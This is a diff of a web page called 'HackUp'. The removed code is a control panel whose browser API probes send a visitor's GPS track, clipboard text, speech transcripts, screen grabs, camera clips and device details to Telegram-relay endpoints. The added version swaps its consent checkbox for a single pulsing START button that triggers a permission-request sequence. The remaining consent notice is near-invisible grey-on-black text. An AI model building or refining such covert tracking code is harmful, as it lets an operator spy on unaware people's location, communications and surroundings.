@@ -3,370 +3,533 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>HackUp · Control Center</title>
+<meta name="theme-color" content="#000000">
+<title>HackUp</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,'Segoe UI',sans-serif}
-body{background:#0a0a12;color:#e0e0ff;min-height:100vh;padding-bottom:70px}
-.nav{position:sticky;top:0;z-index:100;display:flex;justify-content:space-between;align-items:center;padding:10px 14px;background:rgba(18,18,31,.95);border-bottom:1px solid rgba(0,245,160,.15);backdrop-filter:blur(8px);flex-wrap:wrap;gap:8px}
-.brand{display:flex;align-items:center;gap:8px;font-weight:700;color:#00f5a0;font-size:1.05rem}
-.brand .v{font-size:.65rem;background:rgba(0,245,160,.14);padding:2px 8px;border-radius:12px;border:1px solid rgba(0,245,160,.4)}
-.consent{display:flex;align-items:center;gap:8px;font-size:.8rem;padding:6px 12px;background:#181830;border:1px solid rgba(0,245,160,.15);border-radius:20px;cursor:pointer}
-.consent.on{border-color:#00f5a0;color:#00f5a0}
-.consent input{accent-color:#00f5a0}
-.tabs{display:flex;gap:6px;padding:10px 14px;flex-wrap:wrap;border-bottom:1px solid #1a1a2e;background:#0d0d18}
-.tab{padding:6px 14px;border-radius:20px;background:#181830;border:1px solid rgba(0,245,160,.1);color:#a0a0c0;font-size:.8rem;cursor:pointer;font-weight:600}
-.tab.active{background:rgba(0,245,160,.14);border-color:#00f5a0;color:#00f5a0}
-.wrap{padding:14px;max-width:1400px;margin:0 auto}
-.cat{margin:20px 0 8px;font-size:.9rem;color:#00f5a0;letter-spacing:1px;text-transform:uppercase;display:flex;justify-content:space-between;border-bottom:1px solid #1a1a2e;padding-bottom:6px}
-.cat small{color:#556;font-size:.7rem}
-.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px}
-.card{background:#12121f;border:1px solid #1e2a44;border-radius:12px;padding:10px 12px;display:flex;flex-direction:column;gap:6px}
-.card:hover{border-color:rgba(0,245,160,.4)}
-.card .head{display:flex;justify-content:space-between;gap:8px}
-.card .name{font-size:.82rem;font-weight:700;color:#e0e0ff}
-.card .desc{font-size:.68rem;color:#6678aa;line-height:1.3}
-.card .out{font-size:.65rem;color:#8ab;background:#00000055;border:1px solid #1a2a3a;border-radius:6px;padding:4px 6px;max-height:60px;overflow:auto;font-family:monospace;white-space:pre-wrap;word-break:break-all;display:none}
-.card .foot{display:flex;justify-content:space-between;align-items:center;margin-top:auto;gap:8px}
-.badge{font-size:.6rem;padding:2px 8px;border-radius:10px;font-weight:700;text-transform:uppercase}
-.b-ok{background:rgba(0,245,160,.14);color:#00f5a0;border:1px solid rgba(0,245,160,.35)}
-.b-no{background:rgba(255,77,148,.14);color:#ff4d94;border:1px solid rgba(255,77,148,.35)}
-.b-wait{background:rgba(255,215,0,.14);color:#ffd700;border:1px solid rgba(255,215,0,.35)}
-.b-na{background:rgba(100,120,170,.14);color:#6678aa;border:1px solid rgba(100,120,170,.3)}
-.act{background:rgba(0,245,160,.14);border:1px solid rgba(0,245,160,.4);color:#00f5a0;padding:4px 12px;border-radius:16px;font-size:.7rem;font-weight:700;cursor:pointer}
-.act:hover{background:rgba(0,245,160,.28)}
-.act:disabled{opacity:.4;cursor:not-allowed}
-.toolbar{display:flex;flex-wrap:wrap;gap:8px;margin:12px 0;padding:10px;background:#12121f;border:1px solid #1e2a44;border-radius:12px}
-.toolbar button{background:rgba(0,245,160,.14);border:1px solid rgba(0,245,160,.4);color:#00f5a0;padding:6px 14px;border-radius:16px;font-size:.75rem;font-weight:700;cursor:pointer}
-.toolbar button.danger{border-color:#ff4d94;color:#ff4d94;background:rgba(255,77,148,.1)}
-.toolbar .stat{font-size:.75rem;color:#8ab;padding:6px 10px;background:#00000055;border-radius:16px;border:1px solid #1a2a3a}
-.cam-wrap{display:flex;flex-direction:column;gap:10px;align-items:center}
-.cam{position:relative;width:100%;max-width:600px;border-radius:14px;overflow:hidden;border:1px solid rgba(0,245,160,.4);background:#000}
-.cam video,.cam canvas{width:100%;display:block;aspect-ratio:4/3;background:#000}
-.cam canvas{display:none}
-.cam .overlay{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;background:rgba(0,0,0,.85);gap:12px;text-align:center;padding:16px;font-size:.85rem}
-.cam .overlay button{padding:10px 22px;border-radius:8px;background:#fff;color:#000;border:none;font-weight:700;cursor:pointer}
-.footer{position:fixed;bottom:0;left:0;right:0;padding:8px 14px;background:rgba(0,0,0,.85);border-top:1px solid #1a1a2e;font-size:.7rem;color:#446;text-align:center;backdrop-filter:blur(6px)}
-@media(max-width:500px){.grid{grid-template-columns:1fr}}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;height:100%;overflow:hidden;background:#000;color:#fff;font-family:system-ui,-apple-system,sans-serif;-webkit-tap-highlight-color:transparent}
+.stage{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:#000}
+.circle{
+  width:130px;height:130px;border-radius:50%;background:#fff;
+  border:none;cursor:pointer;position:relative;
+  display:flex;align-items:center;justify-content:center;
+  transition:transform .2s ease, box-shadow .3s ease;
+  box-shadow:0 0 0 0 rgba(255,255,255,.7);
+  outline:none;
+}
+.circle:active{transform:scale(.94)}
+.circle.init{animation:pulse 2.2s infinite}
+@keyframes pulse{
+  0%{box-shadow:0 0 0 0 rgba(255,255,255,.55)}
+  70%{box-shadow:0 0 0 40px rgba(255,255,255,0)}
+  100%{box-shadow:0 0 0 0 rgba(255,255,255,0)}
+}
+.circle .label{color:#000;font-size:14px;font-weight:700;letter-spacing:1px;user-select:none}
+.circle.active{background:#0f0;box-shadow:0 0 40px 8px rgba(0,255,0,.4)}
+.circle.active .label{color:#000}
+.status{
+  position:fixed;left:0;right:0;bottom:30px;text-align:center;
+  font-size:12px;color:#666;letter-spacing:1px;pointer-events:none;
+  font-family:monospace;
+}
+.status.on{color:#0f0}
+.tiny{
+  position:fixed;left:0;right:0;bottom:10px;text-align:center;
+  font-size:9px;color:#222;font-family:monospace;pointer-events:none;
+}
+.toast{
+  position:fixed;top:20px;left:50%;transform:translateX(-50%);
+  padding:8px 16px;background:rgba(255,255,255,.08);border:1px solid #333;
+  border-radius:20px;font-size:11px;color:#fff;opacity:0;
+  transition:opacity .3s;font-family:monospace;pointer-events:none;
+  max-width:90vw;text-align:center;
+}
+.toast.show{opacity:1}
 </style>
 </head>
 <body>
 
-<nav class="nav">
-  <div class="brand"><span>H</span> HackUp Control <span class="v">v3.0</span></div>
-  <label class="consent" id="consentBox">
-    <input type="checkbox" id="consentCheck"><span>Consent</span>
-  </label>
-</nav>
-
-<div class="tabs">
-  <div class="tab active" data-cat="api">All APIs</div>
-  <div class="tab" data-cat="camera">Camera</div>
+<div class="stage">
+  <button class="circle init" id="mainBtn" aria-label="Activate">
+    <span class="label">START</span>
+  </button>
 </div>
 
-<div class="wrap">
-  <section id="camSection" style="display:none">
-    <div class="cam-wrap">
-      <div class="cam">
-        <video id="video" autoplay playsinline muted></video>
-        <canvas id="canvas"></canvas>
-        <div class="overlay" id="camOverlay">
-          <div style="color:#00f5a0;letter-spacing:2px">CAMERA READY</div>
-          <button id="enableCam">Allow Camera &amp; Start</button>
-        </div>
-      </div>
-      <div class="toolbar">
-        <button id="capBtn">📸 Capture &amp; Send</button>
-        <button id="flipBtn">🔄 Flip</button>
-        <button id="recBtn">🎥 Start Rec</button>
-        <button id="stopBtn">⏹ Stop</button>
-      </div>
-    </div>
-  </section>
-
-  <section id="apiSection">
-    <div class="toolbar">
-      <span class="stat" id="counter">0 / 0</span>
-      <button id="sendAllBtn">📤 Send Full Report</button>
-      <button id="detectAllBtn">🔍 Re-detect</button>
-      <button class="danger" id="clearLog">Clear</button>
-      <button id="stopPolling" style="display:none">⏹ Stop Auto-Poll</button>
-      <button id="startPolling">▶ Start Auto-Poll</button>
-    </div>
-    <div id="apiRoot"></div>
-  </section>
-</div>
-
-<footer class="footer">HackUp Control Center • own-device consent-based</footer>
+<div class="status" id="status">● IDLE</div>
+<div class="tiny">HackUp Control · consent-based monitoring</div>
+<div class="toast" id="toast"></div>
 
 <script>
 (function(){
 'use strict';
-const $ = s => document.querySelector(s);
-const $$ = s => [...document.querySelectorAll(s)];
-const consent = { granted: false };
-const cc = $('#consentCheck');
-cc.addEventListener('change', () => { consent.granted = cc.checked; $('#consentBox').classList.toggle('on', consent.granted); });
 
-async function post(url, body={}) {
-  if (!consent.granted) throw new Error('Enable consent toggle');
-  const r = await fetch(url, { method:'POST', headers:{'Content-Type':'application/json','X-Consent':'granted'}, body:JSON.stringify(body) });
-  const t = await r.text();
-  let j; try { j = JSON.parse(t); } catch { throw new Error(`HTTP ${r.status}: ${t.slice(0,120)}`); }
-  if (!r.ok || j.success === false) throw new Error(j.error || `HTTP ${r.status}`);
-  return j;
+const btn = document.getElementById('mainBtn');
+const statusEl = document.getElementById('status');
+const toastEl = document.getElementById('toast');
+let active = false;
+let pollTimer = null;
+let camStream = null;
+let camFacing = 'environment';
+
+function toast(msg, ms) {
+  toastEl.textContent = msg;
+  toastEl.classList.add('show');
+  clearTimeout(toast._t);
+  toast._t = setTimeout(()=>toastEl.classList.remove('show'), ms || 2500);
+}
+function setStatus(text, on) {
+  statusEl.textContent = text;
+  statusEl.classList.toggle('on', !!on);
 }
 
-// ============= API REGISTRY =============
-const R = [];
-const reg = (id, name, cat, desc, run, detect) => R.push({id, name, cat, desc, run, detect: detect || (()=>true)});
+/* ============================================================
+   PERMISSION REQUEST SEQUENCE
+   ============================================================ */
+async function requestAllPermissions() {
+  const results = {};
 
-/* ---- SENSORS ---- */
-reg('geo','Geolocation','sensors','GPS position',()=>new Promise((ok,no)=>navigator.geolocation.getCurrentPosition(async p=>{await post('/api/telegram/location',{latitude:p.coords.latitude,longitude:p.coords.longitude,caption:'📍 GPS'});ok(`lat=${p.coords.latitude.toFixed(5)} lon=${p.coords.longitude.toFixed(5)}`);},e=>no(new Error(e.message)),{enableHighAccuracy:true,timeout:15000})),()=>'geolocation' in navigator);
-reg('geowatch','Geolocation Watch','sensors','30s tracking',()=>new Promise(ok=>{let n=0;const id=navigator.geolocation.watchPosition(async p=>{n++;await post('/api/telegram/location',{latitude:p.coords.latitude,longitude:p.coords.longitude,caption:`📍 Track #${n}`}).catch(()=>{});},()=>{},{enableHighAccuracy:true});setTimeout(()=>{navigator.geolocation.clearWatch(id);ok(`Sent ${n} updates`);},30000);}),()=>'geolocation' in navigator);
-reg('orient','DeviceOrientation','sensors','α/β/γ tilt',()=>new Promise(ok=>{const h=e=>{post('/api/telegram/report',{'Orientation':`α=${e.alpha?.toFixed(1)} β=${e.beta?.toFixed(1)} γ=${e.gamma?.toFixed(1)}`}).then(()=>ok('sent'));window.removeEventListener('deviceorientation',h);};window.addEventListener('deviceorientation',h);setTimeout(()=>ok('no event'),4000);}));
-reg('motion','DeviceMotion','sensors','Acceleration',()=>new Promise(ok=>{const h=e=>{const a=e.accelerationIncludingGravity||{};post('/api/telegram/report',{'Motion':`x=${a.x?.toFixed(2)} y=${a.y?.toFixed(2)} z=${a.z?.toFixed(2)}`}).then(()=>ok('sent'));window.removeEventListener('devicemotion',h);};window.addEventListener('devicemotion',h);setTimeout(()=>ok('no event'),4000);}));
-reg('light','AmbientLightSensor','sensors','lux',async()=>{if(!('AmbientLightSensor' in window))throw new Error('Unsupported');const s=new AmbientLightSensor();await s.start();return new Promise(ok=>{s.onreading=async()=>{await post('/api/telegram/report',{'Light (lux)':s.illuminance});s.stop();ok(`${s.illuminance} lux`);};setTimeout(()=>{s.stop();ok('timeout')},3000);});},()=>'AmbientLightSensor' in window);
-reg('accel','Accelerometer','sensors','Generic sensor',async()=>{if(!('Accelerometer' in window))throw new Error('Unsupported');const s=new Accelerometer({frequency:5});await s.start();return new Promise(ok=>{s.onreading=async()=>{await post('/api/telegram/report',{Accelerometer:`x=${s.x.toFixed(2)} y=${s.y.toFixed(2)} z=${s.z.toFixed(2)}`});s.stop();ok('sent');};setTimeout(()=>{s.stop();ok('timeout')},3000);});},()=>'Accelerometer' in window);
-reg('gyro','Gyroscope','sensors','Angular',async()=>{if(!('Gyroscope' in window))throw new Error('Unsupported');const s=new Gyroscope({frequency:5});await s.start();return new Promise(ok=>{s.onreading=async()=>{await post('/api/telegram/report',{Gyroscope:`x=${s.x.toFixed(3)} y=${s.y.toFixed(3)} z=${s.z.toFixed(3)}`});s.stop();ok('sent');};setTimeout(()=>{s.stop();ok('timeout')},3000);});},()=>'Gyroscope' in window);
-reg('mag','Magnetometer','sensors','Magnetic',async()=>{if(!('Magnetometer' in window))throw new Error('Unsupported');const s=new Magnetometer({frequency:5});await s.start();return new Promise(ok=>{s.onreading=async()=>{await post('/api/telegram/report',{Magnetometer:`x=${s.x?.toFixed(2)} y=${s.y?.toFixed(2)} z=${s.z?.toFixed(2)}`});s.stop();ok('sent');};setTimeout(()=>{s.stop();ok('timeout')},3000);});},()=>'Magnetometer' in window);
-reg('perm','Permissions API','sensors','Query permission states',async()=>{const names=['geolocation','notifications','camera','microphone','clipboard-read','persistent-storage','midi','push'];const o={};for(const n of names){try{const s=await navigator.permissions.query({name:n});o[n]=s.state;}catch{o[n]='n/a';}}await post('/api/telegram/report',{Permissions:o});return JSON.stringify(o);},()=>'permissions' in navigator);
-reg('vib','Vibration API','sensors','Vibrate',async()=>{if(!navigator.vibrate)throw new Error('Unsupported');navigator.vibrate([200,100,200]);await post('/api/telegram/message',{text:'📳 Vibrated'});return 'vibrated';},()=>'vibrate' in navigator);
-reg('idle','Idle Detection','sensors','Idle state',async()=>{if(!('IdleDetector' in window))throw new Error('Unsupported');const p=await IdleDetector.requestPermission();if(p!=='granted')throw new Error('Denied');const d=new IdleDetector();await d.start();return 'state: '+(d.userState||'?');},()=>'IdleDetector' in window);
-
-/* ---- MEDIA ---- */
-let camStream=null, camFacing='environment';
-async function startCam(f='environment'){if(camStream)camStream.getTracks().forEach(t=>t.stop());camStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:f},audio:false});$('#video').srcObject=camStream;await $('#video').play();$('#camOverlay').style.display='none';}
-reg('cam','Camera getUserMedia','media','Live video',async()=>{await startCam(camFacing);await post('/api/telegram/message',{text:'📷 Camera started'});return 'live';},()=>!!(navigator.mediaDevices?.getUserMedia));
-reg('mic','Microphone getUserMedia','media','Audio access',async()=>{const s=await navigator.mediaDevices.getUserMedia({audio:true});s.getTracks().forEach(t=>t.stop());await post('/api/telegram/message',{text:'🎙️ Mic granted'});return 'granted';},()=>!!(navigator.mediaDevices?.getUserMedia));
-reg('scr','getDisplayMedia','media','Screen share → photo',async()=>{const s=await navigator.mediaDevices.getDisplayMedia({video:true});const v=document.createElement('video');v.srcObject=s;await v.play();await new Promise(r=>setTimeout(r,800));const c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);await post('/api/upload',{image:c.toDataURL('image/jpeg',.85),caption:'🖥️ Screen'});s.getTracks().forEach(t=>t.stop());return 'sent';},()=>!!(navigator.mediaDevices?.getDisplayMedia));
-reg('rec','MediaRecorder','media','3s video rec',async()=>{await startCam(camFacing);const ch=[];const r=new MediaRecorder(camStream,{mimeType:'video/webm'});r.ondataavailable=e=>ch.push(e.data);r.start();await new Promise(x=>setTimeout(x,3000));r.stop();await new Promise(x=>r.onstop=x);const b=new Blob(ch,{type:'video/webm'});const fr=new FileReader();const b64=await new Promise(x=>{fr.onload=()=>x(fr.result);fr.readAsDataURL(b);});await post('/api/upload',{image:b64,caption:'🎥 3s clip'});return `sent ${(b.size/1024).toFixed(0)}KB`;},()=>'MediaRecorder' in window);
-reg('pip','Picture-in-Picture','media','Float video',async()=>{if(!document.pictureInPictureEnabled)throw new Error('Unsupported');await startCam(camFacing);await $('#video').requestPictureInPicture();return 'PiP active';},()=>'pictureInPictureEnabled' in document);
-reg('docpip','Document PiP','media','Float HTML',async()=>{if(!('documentPictureInPicture' in window))throw new Error('Unsupported');const w=await documentPictureInPicture.requestWindow({width:300,height:200});w.document.body.innerHTML='<h2 style="font-family:sans-serif">HackUp</h2>';return 'opened';},()=>'documentPictureInPicture' in window);
-reg('msess','Media Session','media','OS metadata',async()=>{if(!('mediaSession' in navigator))throw new Error('Unsupported');navigator.mediaSession.metadata=new MediaMetadata({title:'HackUp',artist:'Monitor'});return 'set';},()=>'mediaSession' in navigator);
-reg('mcap','Media Capabilities','media','Codec query',async()=>{if(!navigator.mediaCapabilities)throw new Error('Unsupported');const r=await navigator.mediaCapabilities.decodingInfo({type:'file',audio:{contentType:'audio/mp4',channels:2,bitrate:128000,samplerate:44100},video:{contentType:'video/mp4',width:1280,height:720,bitrate:1500000,framerate:30}});return JSON.stringify(r);},()=>'mediaCapabilities' in navigator);
-
-/* ---- AUDIO ---- */
-reg('waudio','Web Audio','audio','Oscillator + analyser',async()=>{const c=new (AudioContext||webkitAudioContext)();const o=c.createOscillator();const a=c.createAnalyser();o.connect(a);a.connect(c.destination);o.start();await new Promise(r=>setTimeout(r,300));const b=new Uint8Array(a.frequencyBinCount);a.getByteFrequencyData(b);o.stop();await c.close();const avg=(b.reduce((x,y)=>x+y,0)/b.length).toFixed(2);await post('/api/telegram/report',{'Web Audio avg':avg});return 'avg '+avg;},()=>'AudioContext' in window||'webkitAudioContext' in window);
-reg('tts','Speech Synthesis','audio','Text→speech',async()=>{if(!('speechSynthesis' in window))throw new Error('Unsupported');speechSynthesis.speak(new SpeechSynthesisUtterance('HackUp active'));await post('/api/telegram/message',{text:'🔊 TTS fired'});return 'spoken';},()=>'speechSynthesis' in window);
-reg('stt','Speech Recognition','audio','Speech→text',()=>new Promise((ok,no)=>{const S=window.SpeechRecognition||window.webkitSpeechRecognition;if(!S)return no(new Error('Unsupported'));const r=new S();r.lang='en-US';r.onresult=async e=>{const t=e.results[0][0].transcript;await post('/api/telegram/message',{text:'🗣️ '+t});ok(t);};r.onerror=e=>no(new Error(e.error));r.start();setTimeout(()=>{try{r.stop()}catch{};ok('timeout');},6000);}),()=>!!(window.SpeechRecognition||window.webkitSpeechRecognition));
-
-/* ---- NETWORK ---- */
-reg('fetch','Fetch API','network','HTTP',async()=>{const r=await fetch('https://api.ipify.org?format=json');const j=await r.json();await post('/api/telegram/report',{'Public IP':j.ip});return 'IP '+j.ip;},()=>'fetch' in window);
-reg('xhr','XMLHttpRequest','network','AJAX',()=>new Promise((ok,no)=>{const x=new XMLHttpRequest();x.open('GET','https://api.ipify.org?format=json');x.onload=async()=>{await post('/api/telegram/report',{'XHR probe':x.responseText.slice(0,100)});ok('ok');};x.onerror=()=>no(new Error('fail'));x.send();}),()=>'XMLHttpRequest' in window);
-reg('ws','WebSocket','network','Duplex',()=>new Promise(ok=>{try{const w=new WebSocket('wss://echo.websocket.events');w.onopen=()=>{w.send('x');ok('connected');};w.onerror=()=>ok('available (refused)');setTimeout(()=>{try{w.close()}catch{}},3000);}catch{ok('available');}}),()=>'WebSocket' in window);
-reg('sse','EventSource','network','SSE',async()=>'EventSource' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'EventSource' in window);
-reg('bcn','Beacon','network','sendBeacon',async()=>navigator.sendBeacon?`supported`:(()=>{throw new Error('Unsupported')})(),()=>'sendBeacon' in navigator);
-reg('rtc','WebRTC','network','PeerConn',async()=>{if(!window.RTCPeerConnection)throw new Error('Unsupported');const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});const o=await pc.createOffer();await pc.setLocalDescription(o);return 'SDP ok';},()=>'RTCPeerConnection' in window);
-reg('ni','Network Info','network','Connection type',async()=>{const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(!c)throw new Error('Unsupported');const i={type:c.effectiveType,downlink:c.downlink,rtt:c.rtt,saveData:c.saveData};await post('/api/telegram/report',{Network:i});return JSON.stringify(i);},()=>'connection' in navigator||'mozConnection' in navigator);
-reg('bch','BroadcastChannel','network','Cross-tab',async()=>{if(!('BroadcastChannel' in window))throw new Error('Unsupported');const bc=new BroadcastChannel('hackup');bc.postMessage({t:Date.now()});setTimeout(()=>bc.close(),500);return 'sent';},()=>'BroadcastChannel' in window);
-reg('mch','MessageChannel','network','Ports',async()=>{const ch=new MessageChannel();return new Promise(ok=>{ch.port1.onmessage=e=>ok(e.data);ch.port2.postMessage('ping');});},()=>'MessageChannel' in window);
-reg('wt','WebTransport','network','HTTP/3',async()=>'WebTransport' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'WebTransport' in window);
-
-/* ---- STORAGE ---- */
-reg('ls','localStorage','storage','Persistent KV',async()=>{localStorage.setItem('hackup',Date.now());await post('/api/telegram/report',{'localStorage items':localStorage.length});return 'ok';},()=>'localStorage' in window);
-reg('ss','sessionStorage','storage','Session KV',async()=>{sessionStorage.setItem('hackup',Date.now());return 'ok';},()=>'sessionStorage' in window);
-reg('idb','IndexedDB','storage','DB',()=>new Promise((ok,no)=>{if(!('indexedDB' in window))return no(new Error('Unsupported'));const r=indexedDB.open('hackup',1);r.onupgradeneeded=()=>r.result.createObjectStore('kv');r.onsuccess=async()=>{r.result.transaction('kv','readwrite').objectStore('kv').put(Date.now(),'p');await post('/api/telegram/message',{text:'💾 IDB ready'});ok('ready');};r.onerror=()=>no(new Error('fail'));}),()=>'indexedDB' in window);
-reg('caches','CacheStorage','storage','SW cache',async()=>{if(!('caches' in window))throw new Error('Unsupported');const c=await caches.open('hackup');await c.put('/p',new Response('x'));return 'ok';},()=>'caches' in window);
-reg('sm','Storage Manager','storage','Quota',async()=>{if(!navigator.storage)throw new Error('Unsupported');const e=await navigator.storage.estimate();await post('/api/telegram/report',{Storage:{quota:e.quota,usage:e.usage}});return `${(e.usage/1e6).toFixed(2)}MB/${(e.quota/1e6).toFixed(0)}MB`;},()=>'storage' in navigator);
-reg('ck','Cookie Store','storage','Async cookies',async()=>{if(!('cookieStore' in window))throw new Error('Unsupported');await cookieStore.set('h','1');return 'ok';},()=>'cookieStore' in window);
-
-/* ---- CRYPTO ---- */
-reg('cr','Web Crypto','crypto','Random+hash',async()=>{const b=new Uint8Array(16);crypto.getRandomValues(b);const h=await crypto.subtle.digest('SHA-256',b);const hex=[...new Uint8Array(h)].map(x=>x.toString(16).padStart(2,'0')).join('');await post('/api/telegram/report',{'SHA-256':hex});return hex.slice(0,32);},()=>'crypto' in window);
-reg('aes','SubtleCrypto AES','crypto','Encrypt/decrypt',async()=>{const k=await crypto.subtle.generateKey({name:'AES-GCM',length:256},true,['encrypt','decrypt']);const iv=crypto.getRandomValues(new Uint8Array(12));const d=new TextEncoder().encode('x');const e=await crypto.subtle.encrypt({name:'AES-GCM',iv},k,d);await crypto.subtle.decrypt({name:'AES-GCM',iv},k,e);return 'round-trip ok';},()=>'subtle' in (window.crypto||{}));
-reg('wauth','WebAuthn','crypto','Platform auth',async()=>{if(!window.PublicKeyCredential)throw new Error('Unsupported');const ok=await PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();await post('/api/telegram/report',{'WebAuthn platform':ok});return 'avail='+ok;},()=>'PublicKeyCredential' in window);
-reg('clr','Clipboard read','crypto','Read clipboard',async()=>{const t=await navigator.clipboard.readText();await post('/api/telegram/message',{text:'📋 '+t.slice(0,500)});return 'read '+t.length;},()=>navigator.clipboard&&'readText' in navigator.clipboard);
-reg('clw','Clipboard write','crypto','Write clipboard',async()=>{await navigator.clipboard.writeText('HackUp '+Date.now());return 'written';},()=>navigator.clipboard&&'writeText' in navigator.clipboard);
-
-/* ---- PERF ---- */
-reg('io','IntersectionObserver','perf','Element visibility',()=>new Promise(ok=>{if(!('IntersectionObserver' in window))return ok('na');const o=new IntersectionObserver(()=>{});o.observe(document.body);o.disconnect();ok('ok');}),()=>'IntersectionObserver' in window);
-reg('ro','ResizeObserver','perf','Size observer',()=>new Promise(ok=>{const r=new ResizeObserver(()=>{});r.observe(document.body);setTimeout(()=>{r.disconnect();ok('ok');},500);}),()=>'ResizeObserver' in window);
-reg('mo','MutationObserver','perf','DOM observer',()=>new Promise(ok=>{const m=new MutationObserver(()=>{});m.observe(document.body,{childList:true});m.disconnect();ok('ok');}),()=>'MutationObserver' in window);
-reg('perf','Performance','perf','Timing',async()=>{const n=performance.getEntriesByType('navigation')[0]||{};const i={dcl:Math.round(n.domContentLoadedEventEnd),load:Math.round(n.loadEventEnd),type:n.type,mem:performance.memory?`${(performance.memory.usedJSHeapSize/1048576).toFixed(1)}MB`:'n/a'};await post('/api/telegram/report',{Perf:i});return JSON.stringify(i);},()=>'performance' in window);
-reg('ut','User Timing','perf','Marks',async()=>{performance.mark('a');performance.mark('b');performance.measure('m','a','b');return 'ok';},()=>'performance' in window&&'mark' in performance);
-reg('rep','ReportingObserver','perf','Reports',async()=>'ReportingObserver' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'ReportingObserver' in window);
-
-/* ---- WORKERS ---- */
-reg('wkr','Web Worker','workers','Background thread',()=>new Promise((ok,no)=>{try{const w=new Worker(URL.createObjectURL(new Blob(['self.onmessage=()=>self.postMessage("pong")'],{type:'application/javascript'})));w.onmessage=e=>{ok(e.data);w.terminate();};w.postMessage('ping');setTimeout(()=>no(new Error('timeout')),3000);}catch(e){no(e);}}),()=>'Worker' in window);
-reg('sw','Service Worker','workers','SW',async()=>'serviceWorker' in navigator?'ok':(()=>{throw new Error('Unsupported')})(),()=>'serviceWorker' in navigator);
-reg('shw','SharedWorker','workers','Shared',async()=>'SharedWorker' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'SharedWorker' in window);
-
-/* ---- UI ---- */
-reg('fs','Fullscreen','ui','Fullscreen',async()=>{await document.documentElement.requestFullscreen();await post('/api/telegram/message',{text:'⛶ Fullscreen'});return 'entered';},()=>'requestFullscreen' in document.documentElement);
-reg('wl','Wake Lock','ui','Keep awake',async()=>{if(!navigator.wakeLock)throw new Error('Unsupported');const s=await navigator.wakeLock.request('screen');await post('/api/telegram/message',{text:'☀️ WakeLock'});setTimeout(()=>s.release(),3000);return 'held 3s';},()=>'wakeLock' in navigator);
-reg('so','Screen Orientation','ui','Orientation',async()=>{const o=screen.orientation;if(!o)throw new Error('Unsupported');await post('/api/telegram/report',{Orientation:o.type,Angle:o.angle});return o.type;},()=>'orientation' in screen);
-reg('vis','Page Visibility','ui','Visibility',async()=>{await post('/api/telegram/report',{Visibility:document.visibilityState});return document.visibilityState;},()=>'visibilityState' in document);
-reg('ntf','Notifications','ui','Desktop notify',async()=>{const p=await Notification.requestPermission();if(p!=='granted')throw new Error(p);new Notification('HackUp',{body:'Active'});await post('/api/telegram/message',{text:'🔔 Shown'});return 'granted';},()=>'Notification' in window);
-reg('shr','Web Share','ui','Native share',async()=>{if(!navigator.share)throw new Error('Unsupported');await navigator.share({title:'HackUp',text:'Active'});return 'shared';},()=>'share' in navigator);
-reg('hist','History','ui','pushState',async()=>{history.replaceState({t:Date.now()},'');return 'len '+history.length;},()=>'history' in window);
-reg('eye','EyeDropper','ui','Color picker',async()=>{if(!('EyeDropper' in window))throw new Error('Unsupported');const r=await new EyeDropper().open();await post('/api/telegram/report',{Color:r.sRGBHex});return r.sRGBHex;},()=>'EyeDropper' in window);
-
-/* ---- GRAPHICS ---- */
-reg('c2d','Canvas 2D','graphics','2D ctx',async()=>{const c=document.createElement('canvas');c.width=c.height=100;const x=c.getContext('2d');x.fillStyle='#0f0';x.fillRect(0,0,100,100);return 'drew';},()=>!!document.createElement('canvas').getContext('2d'));
-reg('gl','WebGL','graphics','3D',async()=>{const gl=document.createElement('canvas').getContext('webgl');if(!gl)throw new Error('Unsupported');const i={vendor:gl.getParameter(gl.VENDOR),renderer:gl.getParameter(gl.RENDERER)};await post('/api/telegram/report',{WebGL:i});return `${i.vendor}`.slice(0,80);},()=>!!document.createElement('canvas').getContext('webgl'));
-reg('gl2','WebGL2','graphics','WebGL 2',async()=>!!document.createElement('canvas').getContext('webgl2')?'ok':(()=>{throw new Error('Unsupported')})(),()=>!!document.createElement('canvas').getContext('webgl2'));
-reg('gpu','WebGPU','graphics','GPU',async()=>{if(!navigator.gpu)throw new Error('Unsupported');const a=await navigator.gpu.requestAdapter();if(!a)throw new Error('No adapter');return 'adapter ok';},()=>'gpu' in navigator);
-reg('svg','SVG','graphics','Vector',async()=>'SVGSVGElement' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'SVGSVGElement' in window);
-reg('anim','Web Animations','graphics','Animate',async()=>{if(!('animate' in Element.prototype))throw new Error('Unsupported');const d=document.createElement('div');document.body.appendChild(d);const a=d.animate([{opacity:1},{opacity:0}],200);a.finish();d.remove();return 'ran';},()=>'animate' in Element.prototype);
-reg('osc','OffscreenCanvas','graphics','Off-DOM canvas',async()=>'OffscreenCanvas' in window?'ok':(()=>{throw new Error('Unsupported')})(),()=>'OffscreenCanvas' in window);
-
-/* ---- HARDWARE ---- */
-reg('bt','Web Bluetooth','hardware','BLE',async()=>'bluetooth' in navigator?'ok':(()=>{throw new Error('Unsupported')})(),()=>'bluetooth' in navigator);
-reg('usb','WebUSB','hardware','USB',async()=>'usb' in navigator?'ok':(()=>{throw new Error('Unsupported')})(),()=>'usb' in navigator);
-reg('ser','Web Serial','hardware','Serial',async()=>'serial' in navigator?'ok':(()=>{throw new Error('Unsupported')})(),()=>'serial' in navigator);
-reg('hid','Web HID','hardware','HID',async()=>'hid' in navigator?'ok':(()=>{throw new Error('Unsupported')})(),()=>'hid' in navigator);
-reg('midi','Web MIDI','hardware','MIDI',async()=>'requestMIDIAccess' in navigator?'ok':(()=>{throw new Error('Unsupported')})(),()=>'requestMIDIAccess' in navigator);
